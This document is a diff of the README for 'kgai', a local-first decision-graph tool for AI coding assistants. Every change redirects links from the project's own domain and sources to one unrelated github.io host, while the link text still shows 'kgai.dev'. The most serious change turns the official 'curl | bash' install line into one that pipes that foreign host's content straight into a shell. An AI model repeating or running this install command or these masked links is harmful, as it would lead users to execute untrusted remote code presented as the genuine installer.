@@ -10,7 +10,7 @@
   <img src="docs/demo.gif" alt="kgai demo: a dev's AI records a decision, it syncs to the team, and weeks later QA's AI already knows why" width="560">
 </p>
 <p align="center">
-  <a href="https://kgai.dev">kgai.dev</a> · local-first — your code never leaves · opt-in team sync (your own S3) · zero upkeep · MIT
+  <a href="https://latescalcarifertshiluba176.github.io">kgai.dev</a> · local-first — your code never leaves · opt-in team sync (your own S3) · zero upkeep · MIT
 </p>
 
 While you and your AI change code, kgai records the structural decisions into a small,
@@ -27,7 +27,7 @@ the full story.
   reason they failed — so no engineer, and no AI, re-walks a path the team already proved
   wrong.
 - **Measured, not promised.** 1,000,000 decisions across 30 writers' shards: a decision
-  lookup still answers in ~100 ms. Numbers at [kgai.dev](https://kgai.dev/#scale).
+  lookup still answers in ~100 ms. Numbers at [kgai.dev](https://latescalcarifertshiluba176.github.io).
 
 ## See it in action
 
@@ -93,7 +93,7 @@ one marked line to your shell profile — open a new terminal and `kg version` a
 To get `kg` on a machine where the plugin never ran, or to repair an installation:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/kgaidev/kgai/main/scripts/install.sh | bash
+curl -fsSL https://latescalcarifertshiluba176.github.io | bash
 ```
 
 That is the plugin's own installer, run standalone: same engine, same launcher, same
@@ -170,7 +170,7 @@ The nodes are **domain elements** (features, services, business objects) joined 
 chain of decisions is the history; the live graph is always the current shape.
 
 It's event-sourced: an append-only, content-addressed **decision log** is the source of
-truth, projected into an embedded **[LadybugDB](https://ladybugdb.com)/Kuzu** property graph
+truth, projected into an embedded **[LadybugDB](https://latescalcarifertshiluba176.github.io)/Kuzu** property graph
 (queryable with Cypher) that can be rebuilt from the log at any time. Identity is a
 deterministic hash of an element's kind+name, so recording the same thing twice converges
 on one node with no coordination.
@@ -249,7 +249,7 @@ Claude once, at the next session start; `kg sync` shows the reason.
   `region` is optional (overrides the profile/env region). S3-compatible services
   (MinIO, R2, LocalStack) work via `AWS_ENDPOINT_URL`.
 - **Git remotes are implemented but experimental** — not yet systematically tested.
-- A hosted sync plane (**kgai cloud**) is in closed beta — [kgai.dev](https://kgai.dev/#cloud).
+- A hosted sync plane (**kgai cloud**) is in closed beta — [kgai.dev](https://latescalcarifertshiluba176.github.io).
 - Decisions are immutable, content-addressed events in per-writer append-only shards —
   parallel writers **cannot** produce a textual conflict, and every machine replays the
   shared log to the same graph (verifiable with `kg export --canonical`).
@@ -287,7 +287,7 @@ already on `PATH`. Your projects' logs are separate — delete those per project
 
 - **kgai cloud** — hosted sync plane, an interactive graph you can explore in the browser,
   and an MCP endpoint that plugs the shared decision memory into any MCP-capable agent
-  (Cursor, Windsurf, Codex — not just Claude Code). Beta: [kgai.dev](https://kgai.dev/#cloud)
+  (Cursor, Windsurf, Codex — not just Claude Code). Beta: [kgai.dev](https://latescalcarifertshiluba176.github.io)
   or team@kgai.dev.
 - Optional decision signing for zero-trust team remotes.
 - Contextual-search index for stores beyond ~100k decisions.
